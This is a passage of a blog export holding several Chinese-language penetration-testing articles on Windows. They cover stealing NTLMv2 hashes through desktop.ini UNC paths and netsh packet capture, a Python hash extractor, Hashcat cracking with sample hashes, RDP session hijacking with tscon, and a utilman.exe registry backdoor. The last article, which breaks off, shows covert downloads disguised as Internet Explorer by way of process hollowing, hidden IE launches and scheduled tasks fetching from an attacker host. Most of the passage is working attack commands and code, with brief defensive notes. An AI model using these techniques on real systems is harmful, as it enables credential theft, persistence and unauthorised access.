原理同上，更改系统文件夹的配置文件desktop.ini，当用户打开指定文件夹时，将本机当前用户的NTLMv2 Hash发送至伪造文件服务器 默认情况下，系统常见文件夹下包含配置文件desktop.ini，例如文件夹Program Files，desktop.ini内容如下： [.ShellClassInfo] LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21781 尝试对其修改，添加如下内容： IconResource=\\192.168.62.130\test\SHELL32.dll,4 注： 需要管理员权限 测试成功 实际测试：客户端IP: 192.168.62.139 伪造文件服务器IP： 192.168.62.130 1、修改客户端文件，路径为C:\Program Files\desktop.ini，添加内容IconResource=\\192.168.62.130\test\SHELL32.dll,4 注： IconResource指向伪造文件服务器，SHELL32.dll不存在 2、在伪造文件服务器上使用wireshark进行抓包3、客户端访问文件夹c:\4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash如下图 通过这种方式，相比于scf文件，无需添加文件，但需要管理员权限 0x06 防御思路 结合攻击方法，总结防御思路如下： 检查特殊文件.scf和desktop.ini，避免被添加UNC路径 如无特殊需要，建议配置防火墙规则禁止139和445端口 0x07 小结 本文换了一种方式，解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。 通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。 结合攻击方法，总结防御思路。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——利用tscon实现未授权登录远程桌面]]></title>
    <url>%2Fposts%2Fc1178c68.html</url>
    <content type="text"><![CDATA[0x00 前言 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。 这会造成什么影响呢？这个方法能用在哪种条件下呢？结合利用方法又该如何防御呢？本文将要一一介绍 注： 本文使用tscon未授权登录的思路借鉴于如下链接: https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 0x01 简介 本文将要介绍以下内容： tscon的正常用法 利用tscon实现未授权登录远程桌面的方法 应用实例 防御建议 0x02 tscon的正常用法 对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图 测试系统： Server2012 R2 用户Administrator为本地登录 用户b为通过远程桌面服务(RDP)连接3389端口远程登录 接下来，如果用户Administrator想要切换至用户b的远程桌面，可通过右键-Connect进行连接，接着输入密码即可 如下图 tscon是命令行下使用的工具，可实现相同的功能 首先获取用户对应的sessionid，执行如下命令： query user 输出如下图 用户b对应的sessionid为2 通过tscon切换至用户b的桌面，命令如下： tscon 2 /PASSWORD:test123! 0x03 利用tscon实现未授权登录远程桌面的方法 在System权限执行同样的命令，就能够绕过输入密码的过程，直接切换 从Admin权限切换到System权限的方法在之前的文章《渗透技巧——从Admin权限切换到System权限》有过详细介绍，常用方法有如下三种： 通过创建服务获得System权限 利用MSIExec获得System权限 利用token复制获得System权限 选取其中的一种，获得system权限，接着输入如下命令： tscon 2 成功登录 0x04 应用实例一 对于Server2012 R2系统，默认情况下，通过mimikatz无法导出明文口令，测试环境下，通过某些方法获得了服务器的一个用户名密码，可以通过远程桌面进行登录 登录后发现后台存在另一用户 由于未导出明文口令，通过常规方法无法切换至另一用户的桌面 这里就可以借助上文提到的方法，先提权至System权限，再切换过去 特别的地方： 当用户通过远程桌面登录后，直接点击关闭断开连接，如下图 此时该会话并没有结束，后台显示Disconnected，如下图 此时，仍能在system权限下通过tscon实现未授权连接 0x05 应用实例二 利用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)绕过系统登录界面 进程： utilman.exe 登录界面可通过点击图标对其调用，如下图 调用辅助工具管理器的快捷键: Win+U 通过注册表劫持实现后门，修改注册表的命令如下： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f 在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图 通过tscon可直接切换至目标用户的桌面 补充： 在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错 使用incognito能够成功降权，但是操作仍受限，如下图 注： SelectMyParent、Invoke-TokenManipulation.ps1和incognito的使用说明可参考文章《渗透技巧-Token窃取与利用》 无法对目标用户桌面进行截屏，截屏的powershell代码可参考： https://gallery.technet.microsoft.com/scriptcenter/eeff544a-f690-4f6b-a586-11eea6fc5eb8 受限的原因： 登录界面下，虽然是system权限，但是此时的进程均是winlogon的子进程 如下图 绕过思路： 利用WMI做中转，通过WMI启动进程，默认父进程为svchost.exe-&gt;WmiPrvSE.exe 命令如下： wmic process call create commandline = &quot;powershell -ep bypass -f c:\test\system4.ps1&quot; system4.ps1的内容来自于Invoke-TokenManipulation.ps1，以用户win-eq8jfsr081d\b的权限执行脚本，具体参数为： Invoke-TokenManipulation -CreateProcess &quot;c:\test\task.bat&quot; -Username &quot;in-eq8jfsr081d\b&quot; task.bat的功能为输出环境变量到task.txt中，具体参数为： set &gt;&gt;c:\test\task.txt 执行如下图 查看task.txt的内容，判断环境变量，成功降权，如下图 通过这种方式，可以分别降权至High和Medium权限，如下图 0x06 防御建议 建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话 监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话 对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录 0x07 小结 本文介绍了利用tscon实现未授权登录远程桌面的方法，站在攻击者的角度，分析利用思路，最后站在防御的角度，结合攻击方法，给出防御建议。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash]]></title>
    <url>%2Fposts%2Fb546792b.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》比较了NTLM hash和Net-NTLM hash的区别，本文将继续对Net-NTLM hash在内网渗透中的应用作介绍，解决一个有趣的问题： 如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？ 0x01 简介 本文将要介绍以下内容： 在windows平台下不安装任何第三方依赖库来进行网络抓包的方法 将数据包转换成pcap格式 使用Wireshark对数据包进行分析 编写Python提取出NTLMv2 Hash 使用Hashcat对Hash进行破解 0x02 解决思路 《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》中提到，客户端在连接文件服务器时，默认会将当前登录用户的密码Hash发送至服务器进行验证，如果验证失败，需要重新输入登录用户名和口令 如果获得了内网一个文件服务器的权限，那么内网中的其他主机在使用界面尝试访问该服务器时，首先会将本机的密码Hash发送至服务器进行验证，在服务器端抓取数据包能够获得NTLM Response，对NTLM Response的格式进行解析，提取特定信息，使用Hashcat尝试字典破解或者暴力破解，就有可能还原出用户本机的明文口令 所以，接下来需要解决第一个问题： 如何在文件服务器上抓取数据包？ 0x03 Windows平台下进行网络抓包的方法 最常用的方法当然是安装Wireshark，但如果能找到一种不安装任何第三方依赖库、系统自带、直接用来抓包的方法岂不是更好？ 方法当然是有的。 通过Windows系统自带的netsh中的trace功能能够实现不安装任何第三方依赖库，在命令行下进行抓包 支持Win7、Server2008R2及以后的系统，但不支持Server2008 官方说明文档： https://technet.microsoft.com/en-us/library/dd878517%28v=ws.10%29.aspx 注： netsh trace需要管理员权限 使用方法： 1.开启记录功能netsh trace start capture=yes persistent=yes traceFile=&quot;c:\\test\\snmp1.etl&quot; overwrite=yes correlation=no protocol=tcp ipv4.address=192.168.62.130 keywords=ut:authentication 参数说明： capture=yes： 开启抓包功能 persistent=yes： 系统重启不关闭抓包功能，只能通过Netsh trace stop关闭 traceFile： 指定保存记录文件的路径 overwrite=yes： 如果文件存在，那么对其覆盖 correlation=no： 不收集关联事件 protocol=tcp： 抓取TPC协议 ipv4.address=192.168.62.130： 限定只抓和服务器IP相关的数据包 keywords=ut:authentication： 关键字为ut:authentication 加上以上限定参数是为了尽可能减小数据包大小，只筛选出SMB协议中同NTLMv2认证有关的内容 注： 同级目录下会生成系统的配置文件压缩包，后缀名为.cab 2.关闭记录功能Netsh trace stop 关闭功能后，系统会将捕获到的数据包保存为etl结尾的文件 演示如下图 3.查看etl文件etl文件无法直接打开，需要借助工具windows message analyzer将其转换成.cap格式(Wireshark能够识别) windows message analyzer下载地址： https://www.microsoft.com/en-us/download/confirmation.aspx?id=44226 安装后打开etl文件，等待文件识别，识别成功后界面左下角提示Ready，如下图 4.转换成.cap格式File-Save as-Export，保存成cap包格式 使用Wireshark打开cap包文件，成功读取数据包文件，获得服务器上的数据包 从数据包中能找到SMB2协议，如下图 提取其中的一组数据包，还原出NTLM v2的关键信息，如下图 拼接固定格式： username::domain:challenge:HMAC-MD5:blob 使用Hashcat进行破解 注： 详细破解方法可参考文章《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》，本文不再演示 如果手动组装多个NTLM v2响应包，费事费力，所以需要编写程序自动解析数据包，提取出Hashcat可用的NTLM v2内容 这就是第二个问题： 如何通过程序实现自动解析数据包，提取NTLM v2的内容？ 0x04 通过程序实现自动解析数据包 开发语言： python python模块： scapy 说明地址： https://github.com/invernizzi/scapy-http 安装： easy_install scapy easy_install scapy_http scapy能够解析pcap数据包，所以在使用前，先使用Wireshark将.cap包转换成pcap包 scapy示例代码如下： try: import scapy.all as scapy except ImportError: import scapy try: # This import works from the project directory import scapy_http.http except ImportError: # If you installed this package via pip, you just need to execute this from scapy.layers import http packets = scapy.rdpcap(&#39;test.pcap&#39;) for p in packets: print(&#39;=&#39; * 78) p.show() 自动解析出每个数据包的格式，分为Ethernet、IP、TCP和Raw，如下图 程序开发思路： 1.对目的端口进行判断，选出SMB协议的数据包2.筛选出NTLMv2 Response数据包3.通过当前数据包获得username、domain、HMAC-MD5和blob4.通过前一数据包获得Server challenge 具体实现： 1.选出SMB协议的数据包目的端口为445 packets[p][&#39;TCP&#39;].dport == 445 2.筛选出NTLMv2 Response数据包TCP payload包含特殊字符串NTLMSSP packets[p][&#39;Raw&#39;].load.find(&#39;NTLMSSP&#39;) != -1 3.获得通过当前数据包获得username、domain、HMAC-MD5和blobHMAC-MD5和blob为固定位置，直接通过固定偏移即可获得 username和domain为固定格式，2字节表示Length，2字节表示Maxlen，4字节表示偏移，值得注意的2字节长度实际上为int型数据，在读取时高低位要互换 例如读取出16进制数据为4601，实际计算的是0146转换成10进制的值，为326 DomainLength1 = int(TCPPayload[Flag+28:Flag+28+1].encode(&quot;hex&quot;),16) DomainLength2 = int(TCPPayload[Flag+28+1:Flag+28+1+1].encode(&quot;hex&quot;),16)*256 DomainLength = DomainLength1 + DomainLength2 domain以Unicode格式保存，需要转换成ascii，具体实现是把字符串转换成数组，只取奇数位 DomainName = [DomainNameUnicode[i] for i in range(len(DomainNameUnicode)) if i%2==0] DomainName = &#39;&#39;.join(DomainName) 完整实现代码如下： #!/usr/bin/env python try: import scapy.all as scapy except ImportError: import scapy try: # This import works from the project directory import scapy_http.http except ImportError: # If you installed this package via pip, you just need to execute this from scapy.layers import http packets = scapy.rdpcap(&#39;6.pcap&#39;) Num = 1 for p in range(len(packets)): try: if packets[p][&#39;TCP&#39;].dport ==445: TCPPayload = packets[p][&#39;Raw&#39;].load if TCPPayload.find(&#39;NTLMSSP&#39;) != -1: if len(TCPPayload) &gt; 500: print (&quot;----------------------------------Hashcat NTLMv2 No.%s----------------------------------&quot;%(Num)) Num = Num+1 print (&quot;PacketNum: %d&quot;%(p+1)) print (&quot;src: %s&quot;%(packets[p][&#39;IP&#39;].src)) print (&quot;dst: %s&quot;%(packets[p][&#39;IP&#39;].dst)) Flag = TCPPayload.find(&#39;NTLMSSP&#39;) ServerTCPPayload = packets[p-1][&#39;Raw&#39;].load ServerFlag = ServerTCPPayload.find(&#39;NTLMSSP&#39;) ServerChallenge = ServerTCPPayload[ServerFlag+24:ServerFlag+24+8].encode(&quot;hex&quot;) print (&quot;ServerChallenge: %s&quot;%(ServerChallenge)) DomainLength1 = int(TCPPayload[Flag+28:Flag+28+1].encode(&quot;hex&quot;),16) DomainLength2 = int(TCPPayload[Flag+28+1:Flag+28+1+1].encode(&quot;hex&quot;),16)*256 DomainLength = DomainLength1 + DomainLength2 #print DomainLength DomainNameUnicode = TCPPayload[Flag+88:Flag+88+DomainLength] DomainName = [DomainNameUnicode[i] for i in range(len(DomainNameUnicode)) if i%2==0] DomainName = &#39;&#39;.join(DomainName) print (&quot;DomainName: %s&quot;%(DomainName)) UserNameLength1 = int(TCPPayload[Flag+36:Flag+36+1].encode(&quot;hex&quot;),16) UserNameLength2 = int(TCPPayload[Flag+36+1:Flag+36+1+1].encode(&quot;hex&quot;),16)*256 UserNameLength = UserNameLength1 + UserNameLength2 #print UserNameLength UserNameUnicode = TCPPayload[Flag+88+DomainLength:Flag+88+DomainLength+UserNameLength] UserName = [UserNameUnicode[i] for i in range(len(UserNameUnicode)) if i%2==0] UserName = &#39;&#39;.join(UserName) print (&quot;UserName: %s&quot;%(UserName)) NTLMResPonseLength1 = int(TCPPayload[Flag+20:Flag+20+1].encode(&quot;hex&quot;),16) NTLMResPonseLength2 = int(TCPPayload[Flag+20+1:Flag+20+1+1].encode(&quot;hex&quot;),16)*256 NTLMResPonseLength = NTLMResPonseLength1 + NTLMResPonseLength2 #print NTLMResPonseLength NTLMResPonse = TCPPayload[Flag+174:Flag+174+NTLMResPonseLength].encode(&quot;hex&quot;) #print NTLMResPonse print &quot;Hashcat NTLMv2:&quot; print (&quot;%s::%s:%s:%s:%s&quot;%(UserName,DomainName,ServerChallenge,NTLMResPonse[:32],NTLMResPonse[32:])) except: pass 执行后程序输出如下图 接着使用Hashcat进行破解即可 注： 解析pcap包的开源工具： https://github.com/DanMcInerney/net-creds 但在解析ntlmv2的challenge时会出现bug 0x05 补充 对于文件服务器，如果开启了NetBIOS over TCP/IP，那么禁用445端口后，系统会尝试使用139端口进行连接 测试如下： 服务器禁用445端口，开启139端口 客户端尝试连接，SMB协议使用139端口，抓包如下图 如果禁用了NetBIOS over TCP/IP，那么禁用445端口后，无法使用文件共享 0x06 小结 本文解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。 通过Windows命令行抓包获得SMB协议内容，编写程序自动提取NTLMv2 Hash，使用Hashcat进行破解，有可能还原出用户本机的明文口令 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows下的密码hash——NTLM hash和Net-NTLM hash介绍]]></title>
    <url>%2Fposts%2Fa7d434de.html</url>
    <content type="text"><![CDATA[0x00 前言 在Windows系统中，比较常见是从系统导出来的NTLM hash，通过Hashcat能够破解出明文密码。 Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为NetNTLMv1、NetNTLMv1+ESS、NetNTLMv2和NTLM。 NetNTLM具体是什么呢？又是如何获得的呢？本文受到byt3bl33d3r文章的启发，下面将结合自己的心得，介绍这部分内容 学习链接： https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html 0x01 简介 NTLM hash和Net-NTLM hash区别 NTLM hash的加密方法 Net-NTLM hash的破解 0x02 NTLM hash 通常是指Windows系统下Security Account Manager中保存的用户密码hash 该hash的生成方法： 将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00 对Unicode字符串作MD4加密，生成32位的十六进制数字串 实际测试： 用户密码为test123 转换成十六进制的格式为74657374313233 转换成Unicode格式为7400650073007400310032003300 对字符串7400650073007400310032003300作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1 注： MD4加密可使用工具HashCalc，如下图 下面使用mimikatz导出用户密码的hash，对比进行验证，结果相同，验证成功，如下图 在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash 补充： Windows Vista和Windows Server 2008以前的系统还会使用LM hash LM hash的生成方法本文暂不介绍 自Windows Vista和Windows Server 2008开始,Windows取消LM hash 但某些工具的参数需要填写固定格式LM hash:NT hash，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash 0x03 Net-NTLM hash 通过是指网络环境下NTLM认证中的hash NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下： 客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash 服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器 服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功 在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-NTLM hash 更多NTLM认证的资料可参考： http://davenport.sourceforge.net/ntlm.html 在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法 所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash 实际测试： 服务器： IP： 192.168.62.139 登录用户名： a 登录密码： test123 客户端： IP： 192.168.62.130 客户端通过命令行远程连接服务器，命令如下： net use \\192.168.52.139 /u:a test123 同时，客户端运行Wireshark，捕获数据包，如下图 前四个数据包对应NTLM认证的四个步骤 查看第二个数据包，获得Challenge，为c0b5429111f9c5f4，如下图 查看第三个数据包，获得客户端加密后的Challenge，为a9134eee81ca25de，如下图 Response数据为a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000，如下图 下面，使用Hashcat对该Net-NTLM hash进行破解 NTLMv2的格式为： username::domain:challenge:HMAC-MD5:blob 注： challenge为NTLM Server Challenge，domian由数据包内容获得(IP或者机器名) HMAC-MD5对应数据包中的NTProofStr，如下图 blob对应数据包中Response去掉NTProofStr的后半部分 因此，完整的NTLMv2数据如下： a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 为便于测试，新建字典文件，字典内容为test123 Hashcat参数如下： hashcat -m 5600 a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list -o found.txt --force 说明： -m： hash-type，5600对应NetNTLMv2，详细参数可查表：https://hashcat.net/wiki/doku.php? -o： 输出文件字典文件为/tmp/password.list –force代表强制执行，测试系统不支持Intel OpenCL 成功破解出登录的明文密码，输出如下图 在渗透测试中，通常有以下两种利用方法 1、使用中间人攻击的方式来获取Net-NTLM hash，常用工具为Responder和InveighResponder: python编写，可供参考的地址： https://github.com/lgandx/Responder Inveigh: powershell编写，可供参考的地址： https://github.com/Kevin-Robertson/Inveigh 实际测试： 测试环境同上，在同一网段下的一个测试主机运行Inveigh，参数如下： Import-Module .\Inveigh.psd1 Invoke-Inveigh -consoleoutput Y 当客户端通过命令行远程连接服务器时，Inveigh捕获到Net-NTLMv2 hash，如下图 NTLMv2 hash为a::WIN-FVJLPTISCFE:A944CF357E0938DA:C1BB2CDD038D3AA6FA53FD360D7CBA9C:0101000000000000937115D1BC8BD301033605ACA1ACA1C00000000002001E00570049004E002D003100550041004200430047004200470049005500330001001E00570049004E002D003100550041004200430047004200470049005500330004001E00570049004E002D003100550041004200430047004200470049005500330003001E00570049004E002D003100550041004200430047004200470049005500330007000800937115D1BC8BD30106000400020000000800300030000000000000000100000000200000E9D9E613613097D1E2F47C1FD97FA099F65DFD78075D8BDB5CA162492EA5D2990A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00360032002E00310033003900000000000000000000000000 Hashcat参数如下： hashcat -m 5600 a::WIN-FVJLPTISCFE:A944CF357E0938DA:C1BB2CDD038D3AA6FA53FD360D7CBA9C:0101000000000000937115D1BC8BD301033605ACA1ACA1C00000000002001E00570049004E002D003100550041004200430047004200470049005500330001001E00570049004E002D003100550041004200430047004200470049005500330004001E00570049004E002D003100550041004200430047004200470049005500330003001E00570049004E002D003100550041004200430047004200470049005500330007000800937115D1BC8BD30106000400020000000800300030000000000000000100000000200000E9D9E613613097D1E2F47C1FD97FA099F65DFD78075D8BDB5CA162492EA5D2990A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00360032002E00310033003900000000000000000000000000 /tmp/password.list --force 成功破解出登录的明文密码，输出如下图 2、通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录 实际测试： 客户端IP： 192.168.62.139 服务端IP： 192.168.62.130 服务端运行Wireshark，捕获数据包 客服端尝试连接服务器，为便于演示，通过界面操作，地址栏直接输入\\192.168.62.130，弹框提示用户名密码不正确，如下图 此时，服务端的Wireshark已经捕获到数据包，组装Net-NTLMv2 hash，内容如下： a::WIN-FVJLPTISCFE:a05179df44d8cd35:43589a30aea29cf24fbd9c01a85e4b7e:0101000000000000eb8e1d9bf08ed301ca0ea89448cceba80000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800eb8e1d9bf08ed30106000400020000000800300030000000000000000100000000200000e4ab58611d3ed61427fa3c7075c75897aebae420dd42b71c73886ebca92b3c3b0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 Hashcat参数如下： hashcat -m 5600 a::WIN-FVJLPTISCFE:a05179df44d8cd35:43589a30aea29cf24fbd9c01a85e4b7e:0101000000000000eb8e1d9bf08ed301ca0ea89448cceba80000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800eb8e1d9bf08ed30106000400020000000800300030000000000000000100000000200000e4ab58611d3ed61427fa3c7075c75897aebae420dd42b71c73886ebca92b3c3b0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list --force 成功破解出客户端当前用户的明文密码，输出如下图 实际利用举例： 发送钓鱼邮件，用户打开邮件时会隐蔽访问伪造的服务器，服务器通过捕获数据包就能获得目标当前用户的Net-NTLM hash，进一步破解还原出明文密码 0x04 小结 本文介绍了NTLM hash和Net-NTLM hash的区别，实际演示NTLM hash的加密方法和Net-NTLMv2 hash的破解方法。如果破解不出明文密码，对于NTLM hash可使用Pass-The-Hash作进一步利用，那么对于Net-NTLM hash呢？ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——模拟IE浏览器下载文件]]></title>
    <url>%2Fposts%2F1e37ef8.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《从github下载文件的多种方法》介绍了通过cmd从github下载文件的多种方法，选出最短的实现代码(长度为25)。 本文将站在另一角度，介绍Windows系统下模拟IE浏览器实现文件下载的方法。 模拟IE浏览器实现文件下载不仅能够绕过白名单程序的拦截，而且能在一定程度上隐藏下载行为。所以本文将站在利用的角度介绍具体的利用方法，结合利用方法总结防御思路。 0x01 简介 本文将要介绍以下内容： 模拟IE浏览器实现文件下载的多种方法 分析优缺点 总结防御思路 0x02 实现方法 由于方法众多，所以本文做了一个简单分类,整体上分为主动和被动两种模式。主动模式代表通过命令主动实现文件下载，被动模式代表劫持用户行为，在用户打开IE时实现文件下载其中，主动模式也要做一个区分，分为当前后台进程是否有IE浏览器进程iexplore.exe 具体方法如下： 1、主动模式(1) 后台无IE进程a) 调用IE COM对象 参考链接： https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/ 通过COM对象InternetExplorer.Application实现文件下载，后台进程为iexplore.exe powershell代码如下： $ie_com = New-Object -ComObject InternetExplorer.Application $ie_com.Silent = $True $ie_com.Visible = $False $Headers = &quot;Host: &lt;SNIP&gt;.cloudfront.net`r`n&quot; $ie_com.Navigate2(&quot;http://192.168.62.131/index.html&quot;, 14, 0, $Null, $Headers) while($ie_com.busy -eq $true) { Start-Sleep -Milliseconds 100 } $html = $ie_com.document.GetType().InvokeMember(&#39;body&#39;, [System.Reflection.BindingFlags]::GetProperty, $Null, $ie_com.document, $Null).InnerHtml $html $ie_com.Quit(); 注： 若IE从未运行过，执行以上代码会弹框提示 powershell代码引用自https://gist.github.com/leoloobeek/f468d34e81795239a8f8bac03646cf59，该页面还包含cs、js和vbs的实现方法 b) Process Hollowing 参考文章： 《傀儡进程的实现与检测》 创建傀儡进程iexplore.exe，传入参数CREATE_SUSPENDED使进程挂起，清空iexplore.exe进程的内存数据，申请新的内存，写入payload，恢复寄存器环境，执行文件下载 通过c++实现的文件下载代码如下： #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;wininet.h&gt; #define MAXBLOCKSIZE 1024 #pragma comment( lib, &quot;wininet.lib&quot; ) ; void download(const char *Url,const char *save_as) { byte Temp[MAXBLOCKSIZE]; ULONG Number = 1; FILE *stream; HINTERNET hSession = InternetOpen((LPCSTR)&quot;RookIE/1.0&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); if (hSession != NULL) { HINTERNET handle2 = InternetOpenUrl(hSession, (LPCSTR)Url, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0); if (handle2 != NULL) { fopen_s(&amp;stream, save_as, &quot;wb&quot; ); while (Number &gt; 0) { InternetReadFile(handle2, Temp, MAXBLOCKSIZE - 1, &amp;Number); fwrite(Temp, sizeof (char), Number , stream); } fclose( stream ); InternetCloseHandle(handle2); handle2 = NULL; } InternetCloseHandle(hSession); hSession = NULL; } } int main(int argc, char* argv[]){ download(&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;,&quot;c:\\test\\putty.exe&quot;); return 0; } 打开防火墙监控，下载进程为Internet Explorer，完整测试如下图 c) Process Doppelganging 参考文章： 《Process-Doppelganging利用介绍》 原理上类似于Process Hollowing，实现思路为打开一个正常文件，创建transaction；在这个transaction内填入payload，payload作为进程被启动；回滚transaction 需要注意的是Process Doppelganging需要对正常文件进行写入操作。如果是对iexplore.exe进行利用，需要获得Trusted Installer权限，获得Trusted Installer权限的方法可参考文章： 《渗透技巧——Token窃取与利用》 d) 隐蔽启动IE，访问特定网址，通过缓存获得下载的文件 第一种思路： cmd启动IE，访问网址，通过缓存获得下载的文件 start &quot;C:\Program Files\Internet Explorer\iexplore.exe&quot; http://192.168.62.131/evil-kiwi.png 注： 这种方式会打开IE的界面，但可通过API ShowWindowAsync隐藏IE界面，powershell实现脚本： https://github.com/3gstudent/Writeup/blob/master/HiddenProcess.ps1 第二种思路： 通过powershell隐蔽启动IE，访问网址，通过缓存获得下载的文件 powershell -executionpolicy bypass -Command &quot;Start-Process -FilePath \&quot;C:\Program Files\Internet Explorer\iexplore.exe\&quot; -ArgumentList http://192.168.62.131/evil-kiwi.png -WindowStyle Hidden&quot; 以上两种思路通过IE访问网址后，会在如下位置保存缓存文件： Win7: %LOCALAPPDATA%\Microsoft\Windows\Temporary Internet Files Win8、Win10: %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE 可使用通配符获得不同系统下缓存文件的路径，命令如下： dir %LOCALAPPDATA%\*evil-kiwi*.png /s /b 以上两种思路会在IE浏览器留下历史记录，历史记录对应路径为： %LOCALAPPDATA%\Microsoft\Windows\History\ 该方法的父进程为powershell.exe，但可以通过token复制改变父进程(例如SelectMyParent、Invoke-TokenManipulation.ps1) 第三种思路: 利用计划任务启动IE，访问网址，通过缓存获得下载的文件(需要管理员权限) 命令1： at 6:34 &quot;C:\Program Files\Internet Explorer\iexplore.exe&quot; http://192.168.62.131/evil-kiwi.png 命令2： schtasks /create /RU SYSTEM /RP &quot;&quot; /SC ONCE /TN test1 /TR &quot;C:\Program Files\Internet Explorer\iexplore.exe http://192.168.62.131/evil-kiwi.png&quot; /ST 06:34 /F 